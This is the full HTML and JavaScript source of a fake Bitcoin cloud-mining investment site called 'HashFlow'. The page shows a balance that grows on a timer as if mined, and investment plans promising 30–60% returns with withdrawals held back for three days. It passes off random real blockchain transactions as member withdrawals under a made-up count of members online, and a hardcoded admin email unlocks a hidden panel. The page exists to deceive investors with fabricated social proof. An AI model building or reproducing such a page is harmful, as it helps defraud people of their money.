<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>HashFlow BTC Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
:root{
  --bg:#0b0f1a; --card:#131a2e; --accent:#f2a900; --ok:#00ff99; --warn:#ffcc66; --text:#fff;
}
[data-theme="light"]{
  --bg:#f0f2f5; --card:#fff; --accent:#f2a900; --ok:#00aa55; --warn:#ffcc66; --text:#000;
}
*{box-sizing:border-box}
body{margin:0;font-family:Arial;background:var(--bg);color:var(--text)}
a{color:var(--accent);text-decoration:none}
.card{background:var(--card);border-radius:12px;padding:18px;margin:14px auto;max-width:96%}
h2{color:var(--accent);text-align:center;margin:6px 0 10px}
.small{font-size:12px;color:#888;text-align:center}
.btc{font-size:28px;text-align:center;margin:10px 0}
.stats{display:flex;gap:8px;flex-wrap:wrap;justify-content:space-around}
.stats div{background:var(--bg);padding:10px;border-radius:8px;min-width:120px;text-align:center}
.tx{display:flex;justify-content:space-between;gap:10px;font-size:13px;padding:8px 0;border-bottom:1px solid #222}
.badge{padding:2px 6px;border-radius:6px;font-size:11px;margin-left:6px}
.pending{background:var(--warn);color:#000}
.confirmed{background:var(--ok);color:#000}
.progress{height:6px;background:#1b2340;border-radius:6px;overflow:hidden;margin-top:4px}
.progress > div{height:100%;background:var(--ok);width:0%}
input,button{width:100%;padding:10px;margin-top:8px;border-radius:6px;border:none}
button{background:var(--accent);font-weight:bold;cursor:pointer}
canvas{width:100%;height:140px;background:var(--bg);border-radius:8px}
#toastWrap{position:fixed;right:10px;bottom:10px;z-index:9999}
.toast{background:#101735;border-left:4px solid var(--accent);padding:10px 12px;border-radius:8px;margin-top:8px;box-shadow:0 6px 16px rgba(0,0,0,.35);font-size:13px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
.hidden{display:none}
#themeToggle{position:fixed;top:10px;right:10px;padding:6px 12px;border-radius:6px;background:var(--accent);color:#000;font-weight:bold;cursor:pointer;z-index:1000;}
</style>
</head>
<body data-theme="dark">

<div id="themeToggle">Toggle Theme</div>
<div id="toastWrap"></div>

<!-- LOGIN -->
<div class="card" id="loginCard">
  <h2>Login</h2>
  <input id="emailInput" placeholder="Enter email" />
  <button onclick="login()">Login</button>
</div>

<!-- DASHBOARD -->
<div id="dashboard" class="hidden">

  <!-- Mining -->
  <div class="card">
    <h2>Mining Dashboard</h2>
    <p class="small">Live simulation â€¢ Network-based data</p>
    <div class="btc" id="balance">0.00000000 BTC</div>
    <canvas id="chart"></canvas>
    <div class="stats">
      <div>Hashrate<br><b>120 TH/s</b></div>
      <div>Blocks<br><b id="blocks">0</b></div>
      <div>Uptime<br><b id="uptime">0h 0m</b></div>
    </div>
  </div>

  <!-- Plans -->
  <div class="card">
    <h2>Investment Plans</h2>
    <p class="small">âš  Withdrawals available after <b>3 days</b> of mining</p>
    <div class="tx"><span>Plan A</span><span>30% ROI â€¢ Min $200</span></div>
    <div class="tx"><span>Plan B</span><span>45% ROI â€¢ Min $600</span></div>
    <div class="tx"><span>Plan C</span><span>60% ROI â€¢ Min $1100</span></div>
  </div>

  <!-- Group / Withdrawals -->
  <div class="card">
    <h2>Live Withdrawal Group</h2>
    <p class="small">Public BTC blockchain activity</p>
    <div class="tx" style="border:none">
      <span id="members" class="badge confirmed">ðŸ‘¥ 612 members online</span>
      <span class="small">Autoâ€‘updates</span>
    </div>
    <div id="withdrawals"></div>
  </div>

  <!-- Statistics -->
  <div class="card">
    <h2>Withdrawal Statistics</h2>
    <div class="grid">
      <div class="stats"><div>Total Shown<br><b id="statCount">0</b></div></div>
      <div class="stats"><div>Total BTC<br><b id="statBTC">0.000000</b></div></div>
      <div class="stats"><div>Final (6+)<br><b id="statFinal">0</b></div></div>
      <div class="stats"><div>Pending<br><b id="statPending">0</b></div></div>
    </div>
  </div>

  <!-- Admin Analytics -->
  <div class="card hidden" id="adminPanel">
    <h2>Admin Analytics</h2>
    <div class="grid">
      <div class="stats"><div>Unique TXs (Device)<br><b id="admTx">0</b></div></div>
      <div class="stats"><div>Avg BTC / TX<br><b id="admAvg">0.000000</b></div></div>
      <div class="stats"><div>Last Refresh<br><b id="admTime">â€”</b></div></div>
      <div class="stats"><div>Email Notification<br><button id="notifyBtn">Send</button></div></div>
    </div>
    <p class="small">Visible only to admin email</p>
  </div>

</div>

<script>
// ---------- Helpers ----------
const $ = id => document.getElementById(id);
const toast = (msg)=>{
  const d=document.createElement('div');
  d.className='toast';
  d.innerText=msg;
  $('toastWrap').appendChild(d);
  setTimeout(()=>d.remove(),4500);
};

// ---------- Theme toggle ----------
const themeToggle=$('themeToggle');
themeToggle.onclick=()=>{
  const cur=document.body.getAttribute('data-theme');
  const next=cur==='dark'?'light':'dark';
  document.body.setAttribute('data-theme',next);
  localStorage.setItem('theme',next);
};
if(localStorage.getItem('theme')) document.body.setAttribute('data-theme',localStorage.getItem('theme'));

// ---------- Login ----------
let currentEmail="";
function login(){
  const e=$('emailInput').value.trim().toLowerCase();
  if(!e) return alert('Enter email');
  currentEmail=e;
  localStorage.setItem('email',e);
  $('loginCard').classList.add('hidden');
  $('dashboard').classList.remove('hidden');
  if(e==='evilpaid666@gmail.com') $('adminPanel').classList.remove('hidden');
}

// ---------- Mining simulation ----------
let bal=0, blocks=0, mins=0;
setInterval(()=>{ bal+=0.00000008; $('balance').innerText=bal.toFixed(8)+' BTC'; },1000);
setInterval(()=>{ blocks++; mins++; $('blocks').innerText=blocks; $('uptime').innerText=Math.floor(mins/60)+'h '+(mins%60)+'m'; },60000);

// ---------- Chart ----------
const c=$('chart'), ctx=c.getContext('2d'); let pts=[0];
setInterval(()=>{
  ctx.clearRect(0,0,c.width,c.height);
  pts.push((pts.at(-1)||0)+0.00000008);
  if(pts.length>40) pts.shift();
  ctx.beginPath();
  pts.forEach((p,i)=>{
    const y=c.height-(p*8000000);
    i?ctx.lineTo(i*(c.width/40),y):ctx.moveTo(0,y);
  });
  ctx.strokeStyle= 'var(--accent)'; ctx.stroke();
},500);

// ---------- Members ----------
let members=612;
setInterval(()=>{ members+=Math.floor(Math.random()*3); $('members').innerText='ðŸ‘¥ '+members+' members online'; },3600000);

// ---------- REAL BTC Withdrawals ----------
const feed=$('withdrawals');
const usedKey='usedTx_'+currentEmail;
let used=JSON.parse(localStorage.getItem(usedKey))||[];
let statCount=0, statBTC=0, statFinal=0, statPending=0;

function updateStats(){
  $('statCount').innerText=statCount;
  $('statBTC').innerText=statBTC.toFixed(6);
  $('statFinal').innerText=statFinal;
  $('statPending').innerText=statPending;
  if(currentEmail==='evilpaid666@gmail.com'){
    $('admTx').innerText=used.length;
    $('admAvg').innerText= used.length ? (statBTC/used.length).toFixed(6) : '0.000000';
    $('admTime').innerText=new Date().toLocaleTimeString();
  }
}

async function loadWithdrawals(){
  try{
    const tip=await (await fetch('https://blockstream.info/api/blocks/tip/hash')).text();
    const txs=await (await fetch(`https://blockstream.info/api/block/${tip}/txs`)).json();
    txs.forEach(tx=>{
      if(used.includes(tx.txid)) return;
      const out=tx.vout.find(v=>v.value>60000);
      if(!out) return;

      used.push(tx.txid);
      localStorage.setItem(usedKey,JSON.stringify(used));

      const btc=(out.value/1e8);
      statCount++; statBTC+=btc; statPending++;

      const row=document.createElement('div');
      row.className='tx';
      row.innerHTML=`
        <span>
          ðŸ’¸ User withdrew <b>${btc.toFixed(6)} BTC</b>
          <span id="b-${tx.txid}" class="badge pending">Pending</span>
          <div class="progress"><div id="p-${tx.txid}"></div></div>
        </span>
        <span><a target="_blank" href="https://blockstream.info/tx/${tx.txid}">TX</a></span>
      `;
      feed.prepend(row);
      toast(`New withdrawal detected: ${btc.toFixed(6)} BTC`);
      updateConf(tx.txid);
      setInterval(()=>updateConf(tx.txid),60000);
      if(feed.children.length>40) feed.removeChild(feed.lastChild);
      updateStats();
    });
  }catch(e){}
}

async function updateConf(id){
  try{
    const d=await (await fetch(`https://blockstream.info/api/tx/${id}`)).json();
    const badge=$('b-'+id), bar=$('p-'+id);
    if(!badge) return;

    if(!d.status.confirmed){ bar.style.width='0%'; return; }

    const conf=Math.max(1,Math.floor((Date.now()/1000 - d.status.block_time)/600));
    const pct=Math.min(100, (conf/6)*100);
    bar.style.width=pct+'%';

    if(conf>=6){
      if(badge.classList.contains('pending')){
        statPending--; statFinal++; toast('Withdrawal fully confirmed (6+)');
      }
      badge.innerText='Final (6+)'; badge.className='badge confirmed';
    }else{
      badge.innerText='Confirmed ('+conf+')'; badge.className='badge confirmed';
    }
    updateStats();
  }catch(e){}
}

loadWithdrawals();
setInterval(loadWithdrawals,90000);

// ---------- Admin Email Notification ----------
const notifyBtn=$('notifyBtn');
if(notifyBtn){
  notifyBtn.onclick=()=>{
    if(currentEmail==='evilpaid666@gmail.com'){
      window.location.href = 'mailto:youradminemail@example.com?subject=Withdrawal+Update&body=Check+dashboard+for+latest+withdrawals';
    }
  };
}
</script>
</body>
</html>
